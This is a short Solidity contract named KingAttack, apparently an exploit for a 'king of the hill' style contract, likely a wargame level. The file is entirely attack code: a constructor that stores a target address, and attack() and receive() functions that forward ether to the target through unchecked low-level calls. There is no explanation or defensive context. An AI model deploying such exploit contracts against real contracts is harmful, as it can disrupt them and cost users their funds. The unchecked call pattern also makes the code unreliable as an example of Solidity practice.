// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address payable targetAddress;

    constructor(address payable _targetAddress) payable {
        targetAddress = _targetAddress;
    }

    function attack() external payable {
        targetAddress.call{value: msg.value}("");
    }

    receive() external payable {
        targetAddress.call{value: msg.value}("");
    }
}
